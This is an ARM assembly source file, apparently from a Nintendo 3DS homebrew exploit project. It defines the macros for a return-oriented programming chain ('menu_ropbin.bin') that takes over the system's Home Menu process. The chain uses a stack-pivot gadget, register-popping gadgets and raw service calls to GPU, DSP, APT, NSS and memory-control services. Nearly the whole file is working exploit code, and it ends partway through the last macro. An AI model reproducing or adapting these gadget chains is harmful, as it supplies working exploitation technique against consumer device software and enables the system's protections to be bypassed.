.nds

.include "../build/constants.s"

.loadtable "unicode.tbl"

.create "menu_ropbin.bin",0x0

MENU_OBJECT_LOC equ MENU_LOADEDROP_BUFADR

MENU_STACK_PIVOT equ ROP_MENU_STACK_PIVOT ; our stack pivot (found by yellows8) : ldmdavc r4, {r4, r5, r8, sl, fp, ip, sp, pc}
MENU_NOP equ ROP_MENU_POP_PC ; pop {pc}
MENU_SLEEP equ ROP_MENU_SLEEPTHREAD
MENU_CONNECTTOPORT equ ROP_MENU_CONNECTTOPORT

MENU_NSS_LAUNCHTITLE equ ROP_MENU_NSS_LAUNCHTITLE ; r0 : out_ptr, r1 : unused ?, r2 : tidlow, r3 : tidhigh, sp_0 : flag
MENU_GSPGPU_RELEASERIGHT equ ROP_MENU_GSPGPU_RELEASERIGHT ; r0 : handle addr
MENU_GSPGPU_ACQUIRERIGHT equ ROP_MENU_GSPGPU_ACQUIRERIGHT ; r0 : handle addr
MENU_GSPGPU_FLUSHDATACACHE equ ROP_MENU_GSPGPU_FLUSHDATACACHE ; r0 : gsp handle ptr, r1 : process handle, r2 : address, r3 : size
MENU_GSPGPU_WRITEHWREGS equ ROP_MENU_GSPGPU_WRITEHWREGS ; r0 : base reg, r1 : data ptr, r2 : data size
MENU_GSPGPU_GXTRYENQUEUE equ ROP_MENU_GSPGPU_GXTRYENQUEUE ; r0 : interrupt receiver ptr, r1 : gx cmd data ptr
MENU_MEMCPY equ ROP_MENU_MEMCPY ; r0 : dst, r1 : src, r2 : size

APP_START_LINEAR equ 0xBABE0002

GPU_REG_BASE equ 0x1EB00000

WAITLOOP_DST equ (MENU_LOADEDROP_BUFADR - (waitLoop_end - waitLoop_start))
WAITLOOP_OFFSET equ (- waitLoop_start - (waitLoop_end - waitLoop_start))

MENU_SCREENSHOTS_FILEOBJECT equ (MENU_LOADEDROP_BUFADR + screenshots_obj)
MENU_SHAREDMEMBLOCK_PTR equ (MENU_LOADEDROP_BKP_BUFADR + sharedmemAddress) ; in BKP because we want it to persist
MENU_SHAREDMEMBLOCK_HANDLE equ (MENU_LOADEDROP_BKP_BUFADR + sharedmemHandle) ; in BKP because we want it to persist

MENU_DSP_BINARY equ (MENU_DSP_BINARY_AFTERSIG - 0x100)
MENU_SHAREDDSPBLOCK_PTR equ (MENU_LOADEDROP_BKP_BUFADR + shareddspAddress) ; in BKP because we want it to persist
MENU_SHAREDDSPBLOCK_HANDLE equ (MENU_LOADEDROP_BKP_BUFADR + shareddspHandle) ; in BKP because we want it to persist
HB_DSP_SIZE equ ((MENU_DSP_BINARY_SIZE + 0xfff) & 0xfffff000)
HB_DSP_ADDR equ (HB_MEM0_ADDR - HB_DSP_SIZE)

DUMMY_PTR equ (WAITLOOP_DST - 4)

.macro set_lr,_lr
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_NOP ; pop {pc}
	.word ROP_MENU_POP_R4LR_BX_R0 ; pop {r4, lr} ; bx r0
		.word 0xDEADBABE ; r4 (garbage)
		.word _lr ; lr
.endmacro

.macro nss_launch_title,tidlow,tidhigh
	set_lr ROP_MENU_POP_R4PC ; pop {r4, pc}
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_OBJECT_LOC - 4 ; r0 (out ptr)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word tidlow ; r2 (tid low) 
		.word tidhigh ; r3 (tid high)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word MENU_NSS_LAUNCHTITLE
		.word 0x00000001 ; sp_0 (flag)
.endmacro

; this memcpy's the size bytes that immediately preceed its call
.macro memcpy_r0_lr_prev,size,skip,offset
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word (MENU_OBJECT_LOC + offset + (. - 4 - size) - object) ; r1 (src)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word size ; r2 (size)
		.word 0xDEADBABE ; r3 (garbage)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.if skip != 0
		skip_0x1C
	.endif
	.word MENU_MEMCPY
.endmacro

.macro memcpy,dst,src,size,skip,offset
	set_lr MENU_NOP
	.if skip != 0
		store MENU_MEMCPY, @@function_call + MENU_LOADEDROP_BUFADR + offset
	.endif
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word dst ; r0 (out ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word src ; r1 (src)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word size ; r2 (size)
		.word 0xDEADBABE ; r3 (garbage)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.if skip != 0
		skip_0x1C
	.endif
	@@function_call:
	.word MENU_MEMCPY
.endmacro

.macro skip_0x84
	.word ROP_MENU_ADD_SPSPx64_POP_R4RR11PC
		.fill 0x84, 0xDA
.endmacro

.macro skip_0x1C
	.word ROP_MENU_POP_R4R5R6R7R8R9R10PC
		.fill 0x1C, 0xDA
.endmacro

.macro apt_open_session,skip,offset
	set_lr MENU_NOP
	.if skip != 0
		store ROP_MENU_APT_OPENSESSION, @@opensession_call + MENU_LOADEDROP_BUFADR + offset
		skip_0x84
	.endif
	@@opensession_call:
	.word ROP_MENU_APT_OPENSESSION
.endmacro

.macro apt_close_session,skip,offset
	set_lr MENU_NOP
	.if skip != 0
		store ROP_MENU_APT_CLOSESESSION, @@closesession_call + MENU_LOADEDROP_BUFADR + offset
		skip_0x84
	.endif
	@@closesession_call:
	.word ROP_MENU_APT_CLOSESESSION
.endmacro

.macro apt_glance_parameter,app_id,buffer_ptr,buffer_size,out_cmd_ptr,out_handle_ptr,skip,offset
	; first dereference handle_ptr
	.if skip != 0
		store ROP_MENU_APT_GLANCEPARAMETER, @@glance_call + MENU_LOADEDROP_BUFADR + offset
	.endif
	set_lr ROP_MENU_POP_R4R5R6PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word DUMMY_PTR ; r0 (app_id out ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word app_id ; r1 (app_id)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word out_cmd_ptr ; r2 (signal out ptr)
		.word DUMMY_PTR ; r3 (out buffer ptr)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.if skip != 0
		skip_0x84
	.endif
	@@glance_call:
	.word ROP_MENU_APT_GLANCEPARAMETER
		.word 0x00000000 ; arg_0 (out buffer size) (r4 (garbage))
		.word DUMMY_PTR ; arg_4 (actual size out ptr) (r5 (garbage))
		.word DUMMY_PTR ; arg_8 (handle out ptr) (r6 (garbage))
.endmacro

.macro apt_receive_parameter,app_id,buffer_ptr,buffer_size,out_cmd_ptr,out_handle_ptr,skip,offset
	; first dereference handle_ptr
	.if skip != 0
		store ROP_MENU_APT_RECEIVEPARAMETER, @@function_call + MENU_LOADEDROP_BUFADR + offset
	.endif
	set_lr ROP_MENU_POP_R4R5R6PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word DUMMY_PTR ; r0 (app_id out ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word app_id ; r1 (app_id)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word out_cmd_ptr ; r2 (signal out ptr)
		.word DUMMY_PTR ; r3 (out buffer ptr)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.if skip != 0
		skip_0x84
	.endif
	@@function_call:
	.word ROP_MENU_APT_RECEIVEPARAMETER
		.word 0x00000000 ; arg_0 (out buffer size) (r4 (garbage))
		.word DUMMY_PTR ; arg_4 (actual size out ptr) (r5 (garbage))
		.word DUMMY_PTR ; arg_8 (handle out ptr) (r6 (garbage))
.endmacro

.macro apt_inquire_notification,app_id,out_ptr,skip,offset
	; first dereference handle_ptr
	set_lr MENU_NOP
	.if skip != 0
		store ROP_MENU_APT_INQUIRENOTIFICATION, @@function_call + MENU_LOADEDROP_BUFADR + offset
	.endif
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word app_id ; r0 (app_id out ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word out_ptr ; r1 (app_id)
	.if skip != 0
		skip_0x1C
	.endif
	@@function_call:
	.word ROP_MENU_APT_INQUIRENOTIFICATION
.endmacro

.macro apt_send_parameter,dst_id,buffer_ptr,buffer_size,handle_ptr
	; first dereference handle_ptr
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word handle_ptr ; r0
	.word ROP_MENU_LDR_R0R0_POP_R4PC ; ldr r0, [r0] ; pop {r4, pc}
		.word MENU_LOADEDROP_BUFADR + @@handle_loc ; r4 (destination address)
	.word ROP_MENU_STR_R0R4_POP_R4PC ; str r0, [r4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
	set_lr ROP_MENU_POP_R4R5PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word 0x101 ; r0 (source app_id)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word dst_id ; r1 (destination app_id)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word 0x00000001 ; r2 (signal type)
		.word buffer_ptr ; r3 (parameter buffer ptr)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word ROP_MENU_APT_SENDPARAMETER
		.word buffer_size ; arg_0 (parameter buffer size) (r4 (garbage))
		@@handle_loc:
		.word 0xDEADBABE ; arg_4 (handle passed to dst) (will be overwritten by dereferenced handle_ptr) (r5 (garbage))
.endmacro

.macro apt_prepare_start_application,tid_low,tid_high,mediatype,flag
	; first dereference handle_ptr
	set_lr ROP_MENU_POP_R2R3R4R5R6PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_OBJECT_LOC + @@tid_struct ; r0
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word flag ; r1
	.word ROP_MENU_APT_PREPARETOSTARTAPPLICATION
		@@tid_struct:
		.word tid_low ; r2
		.word tid_high ; r3
		.word mediatype ; r4
		.word 0 ; r5
		.word 0xDEADBABE ; r6 (garbage)
.endmacro

.macro apt_start_application,buf0,buf0_size,buf1,buf1_size,flag
	set_lr ROP_MENU_POP_R4PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word buf0 ; r0 (buf0 ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word buf0_size ; r1 (buf0 size)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word buf1 ; r2 (buf1 ptr)
		.word buf1_size ; r3 (buf1 size)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word ROP_MENU_APT_STARTAPPLICATION
		.word flag ; arg_0 (flag) (r4 (garbage))
.endmacro

.macro apt_send_deliver_arg,buf0,buf0_size,buf1,buf1_size
	set_lr ROP_MENU_POP_PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word buf0 ; r0 (buf0 ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word buf0_size ; r1 (buf0 size)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word buf1 ; r2 (buf1 ptr)
		.word buf1_size ; r3 (buf1 size)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word ROP_MENU_APT_SENDDELIVERARG
.endmacro

.macro apt_reply_sleepquery,appid,a
	set_lr ROP_MENU_POP_PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word appid ; r0
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word a ; r1
	.word ROP_MENU_APT_REPLYSLEEPQUERY
.endmacro

.macro apt_reply_sleepnotification_complete,appid
	set_lr ROP_MENU_POP_PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word appid ; r0
	.word ROP_MENU_APT_REPLYSLEEPNOTIFICATIONCOMPLETE
.endmacro

.macro apt_is_registered,appid,out,skip,offset
	set_lr ROP_MENU_POP_PC
	.if skip != 0
		store ROP_MENU_APT_ISREGISTERED, @@function_call + MENU_LOADEDROP_BUFADR + offset
	.endif
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word appid ; r0
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word out ; r1
	.if skip != 0
		skip_0x1C
	.endif
	@@function_call:
	.word ROP_MENU_APT_ISREGISTERED
.endmacro

.macro apt_order_close_application
	set_lr ROP_MENU_POP_PC
	.word ROP_MENU_APT_ORDERTOCLOSEAPPLICATION
.endmacro

.macro apt_wakeup_application,skip,offset
	set_lr ROP_MENU_POP_PC
	.if skip != 0
		store ROP_MENU_APT_WAKEUPAPPLICATION, @@function_call + MENU_LOADEDROP_BUFADR + offset
		skip_0x84
	.endif
	@@function_call:
	.word ROP_MENU_APT_WAKEUPAPPLICATION
.endmacro

.macro apt_applet_utility_cmd2
	set_lr ROP_MENU_POP_PC
	.word ROP_MENU_APT_APPLETUTILITYCMD2
.endmacro

.macro apt_applet_utility_cmd7,val
	set_lr ROP_MENU_POP_PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word val ; r0
	.word ROP_MENU_APT_APPLETUTILITYCMD7
.endmacro

.macro apt_clear_homebutton_state
	set_lr ROP_MENU_POP_PC
	.word ROP_MENU_CLEARHOMEBUTTONSTATE
.endmacro

.macro apt_prepare_leave_homemenu,skip,offset
	set_lr ROP_MENU_POP_PC
	.if skip != 0
		store ROP_MENU_APT_PREPARETOLEAVEHOMEMENU, @@function_call + MENU_LOADEDROP_BUFADR + offset
		skip_0x84
	.endif
	@@function_call:
	.word ROP_MENU_APT_PREPARETOLEAVEHOMEMENU
.endmacro

.macro apt_leave_homemenu,skip,offset
	.if skip != 0
		store ROP_MENU_APT_LEAVEHOMEMENU, @@function_call + MENU_LOADEDROP_BUFADR + offset
	.endif
	set_lr ROP_MENU_POP_PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word 0x00000000 ; r0 (buf0 ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word 0x00000000 ; r1 (buf0 size)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word 0x00000000 ; r2 (flag ?)
		.word 0x00000000 ; r3 (garbage)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.if skip != 0
		skip_0x84
	.endif
	@@function_call:
	.word ROP_MENU_APT_LEAVEHOMEMENU
.endmacro

.macro wait_for_parameter_and_send,buffer_ptr, handle_ptr
	store MENU_LOADEDROP_BUFADR + @@ret_sp, MENU_LOADEDROP_BUFADR + waitForParameter_loop_retsp
	store MENU_STACK_PIVOT, MENU_LOADEDROP_BUFADR + waitForParameter_loop_pivot
	store handle_ptr, MENU_LOADEDROP_BUFADR + waitForParameter_loop_handle_ptr
	store buffer_ptr, MENU_LOADEDROP_BUFADR + waitForParameter_loop_buffer_ptr
	jump_sp MENU_LOADEDROP_BUFADR + waitForParameter_loop_memcpy
	@@ret_sp:
.endmacro

.macro jump_sp,dst
	.word ROP_MENU_POP_R4PC
		.word MENU_OBJECT_LOC + @@pivot_data + 4 ; r4 (pivot data location)
	.word ROP_MENU_STACK_PIVOT
	.word ROP_MENU_POP_R4R5PC
	@@pivot_data:
		.word dst ; sp
		.word MENU_NOP ; pc
.endmacro

.macro jump_sp_if_ne,cond_sp
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word ROP_MENU_STACK_PIVOT ; r2 (pivot address)
		.word 0xDEADBABE ; r3 (garbage)
		.word MENU_OBJECT_LOC + @@cond_pivot_data + 4 ; r4 (pivot data location)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word ROP_MENU_BLXNE_R2_ADD_SPx8_MOV_R0R4_POP_R4R5R6R7R8PC
	@@cond_pivot_data:
		.word cond_sp ; sp
		.word MENU_NOP ; pc
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
		.word 0xDEADBABE ; r7 (garbage)
		.word 0xDEADBABE ; r8 (garbage)
.endmacro

.macro cond_jump_sp,cond_sp,cmpval_adr,cmpval_imm
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word cmpval_adr ; r0 (ptr)
	.word ROP_MENU_LDR_R0R0_POP_R4PC ; pop {r0, pc}
		.word 0xDEADBABE ; r4 (garbage)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word cmpval_imm ; r1 (ptr)
	.word ROP_MENU_CMP_R0R1_MVNLS_R0x0_MOVHI_R0x1_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
	jump_sp_if_ne cond_sp
.endmacro

.macro gsp_acquire_right
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_GSPGPU_HANDLE ; r0 (gsp handle ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word 0xFFFF8001 ; r1 (process handle)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word 0x00000000 ; r2 (flags)
		.word 0xDEADBABE ; r2 (garbage)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word MENU_GSPGPU_ACQUIRERIGHT
.endmacro

.macro dsp_register_interrupt_events
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_DSP_HANDLE_STRUCT + 0x10 ; r0 (dsp handle ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word 0x00000000 ; r1 (interrupt handle)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word 0x00000002 ; r2 (param0)
		.word 0x00000002 ; r2 (param1)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word ROP_MENU_DSP_REGISTERINTERRUPTEVENTS
.endmacro

.macro dsp_unload_component
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_DSP_HANDLE_STRUCT + 0x10 ; r0 (dsp handle ptr)
	.word ROP_MENU_DSP_UNLOADCOMPONENT
.endmacro

.macro gsp_release_right
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_GSPGPU_HANDLE ; r0 (gsp handle ptr)
	.word MENU_GSPGPU_RELEASERIGHT
.endmacro

.macro flush_dcache,addr,size
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_GSPGPU_HANDLE ; r0 (handle ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word 0xFFFF8001 ; r1 (process handle)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word addr ; r2 (addr)
		.word size ; r3 (src)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word MENU_GSPGPU_FLUSHDATACACHE
.endmacro

.macro writehwregs,reg,data,size
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_GSPGPU_HANDLE ; r0 (handle ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word reg ; r1 (reg base)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word data ; r2 (data ptr)
		.word size ; r3 (size)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word MENU_GSPGPU_WRITEHWREGS
.endmacro

.macro control_memory,outaddr,addr0,addr1,size,operation,permissions
	set_lr ROP_MENU_POP_R4R5PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word outaddr ; r0
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word addr0 ; r1
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word addr1 ; r2
		.word size ; r3 (size)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word ROP_MENU_CONTROLMEMORY
		.word operation ; arg_0
		.word permissions ; arg_4
.endmacro

.macro free_memory_deref,ptr,size
	set_lr ROP_MENU_POP_R4R5PC
	.word ROP_MENU_POP_R4PC ; pop {r1, pc}
		.word ptr - 4 ; r1
	.word ROP_MENU_LDR_R1R4x4_ADD_R0R0R1_POP_R3R4R5PC
		.word 0xDEADBABE ; r3 (garbage)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word DUMMY_PTR ; r0
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word 0x00000000 ; r2
		.word size ; r3 (size)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word ROP_MENU_CONTROLMEMORY
		.word 0x00000001 ; arg_0
		.word 0x00000000 ; arg_4
.endmacro

.macro writehwreg,reg,data
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		@@reg_data:
			.word data ; r0 (just used to skip over data)
	writehwregs reg, (MENU_OBJECT_LOC + @@reg_data - object), 0x4
.endmacro

.macro get_cmdbuf,offset
	set_lr MENU_NOP
	.word ROP_MENU_MRC_R0C13C03_ADD_R0R0x5C_BX_LR ; mrc 15, 0, r0, cr13, cr0, {3} ; add r0, r0, #0x5c ; bx lr
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word (0x80+offset-0x5C) / 4 ; r1
	.word ROP_MENU_ADD_R0R0R1LSL2_POP_R4PC ; add r0, r0, r1, lsl #2 ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro srv_subscribe_notification,id
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC
		.word id
	.word ROP_MENU_SRV_SUBSCRIBE
.endmacro

.macro srv_get_handle,str_ptr,len,out_ptr
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC
		.word out_ptr
	.word ROP_MENU_POP_R1PC
		.word str_ptr
	.word ROP_MENU_POP_R2R3R4R5R6PC
		.word len
		.word 0x00000000
		.word 0xDEADBABE
		.word 0xDEADBABE
		.word 0xDEADBABE
	.word ROP_MENU_SRV_GETHANDLE
.endmacro

.macro srv_receive_notification
	get_cmdbuf 0
	.word ROP_MENU_POP_R1PC
		.word 0x000B0000 ; command header
	.word ROP_MENU_STR_R1R0_POP_R4PC
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_SRV_HANDLE ; r0 (gsp:gpu handle)
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro invalidate_dcache,addr,size
	get_cmdbuf 0
	.word ROP_MENU_POP_R4R5R6R7R8PC ; pop {r4, r5, r6, r7, r8, pc}
		; nss_terminate_tid_cmd_buf:
		.word 0x00090082 ; command header
		.word addr ; address
		.word size ; size
		.word 0x00000000 ; size
		.word 0xFFFF8001 ; process handle
	memcpy_r0_lr_prev (4 * 5), 1, 0
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_GSPGPU_HANDLE ; r0 (gsp:gpu handle)
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro nss_terminate_tid,tid_low,tid_high,timeout_low
	get_cmdbuf 0
	.word ROP_MENU_POP_R4R5R6R7R8PC ; pop {r4, r5, r6, r7, r8, pc}
		; nss_terminate_tid_cmd_buf:
		.word 0x00110100 ; command header
		.word tid_low ; tid low
		.word tid_high ; tid high
		.word timeout_low ; timeout low
		.word 0x00000000 ; timeout high
	memcpy_r0_lr_prev (4 * 5), 1, 0
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_NSS_HANDLE ; r0 (ns:s handle)
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro nss_terminate_tid_deref,tid_low_ptr,tid_high_ptr,timeout_low,offset
	load_store tid_low_ptr, MENU_LOADEDROP_BUFADR + offset + @@tid_low
	load_store tid_high_ptr, MENU_LOADEDROP_BUFADR + offset + @@tid_high
	get_cmdbuf 0
	.word ROP_MENU_POP_R4R5R6R7R8PC ; pop {r4, r5, r6, r7, r8, pc}
		.word 0x00110100 ; command header
		@@tid_low:
		.word 0xDEADBABE ; tid low
		@@tid_high:
		.word 0xDEADBABE ; tid high
		.word timeout_low ; timeout low
		.word 0x00000000 ; timeout high
	memcpy_r0_lr_prev (4 * 5), 1, offset
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_NSS_HANDLE ; r0 (ns:s handle)
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro apt_prepare_jump_application
	get_cmdbuf 0
	.word ROP_MENU_POP_R4R5PC
		.word 0x00230040 ; command header
		.word 0x00000000
	memcpy_r0_lr_prev (4 * 2), 1, 0
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_APT_HANDLE ; r0 (apt handle)
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro apt_jump_application
	get_cmdbuf 0
	.word ROP_MENU_POP_R4R5R6R7R8PC
		.word 0x00240044 ; command header
		.word 0x00000000
		.word 0x00000000
		.word 0x00000000
		.word 0x00000002
	memcpy_r0_lr_prev (4 * 5), 1, 0
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_APT_HANDLE ; r0 (apt handle)
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro apt_hardware_reboot_async
	get_cmdbuf 0
	.word ROP_MENU_POP_R4PC
		.word 0x004E0000 ; command header
	memcpy_r0_lr_prev (4 * 1), 1, 0
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_APT_HANDLE ; r0 (apt handle)
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
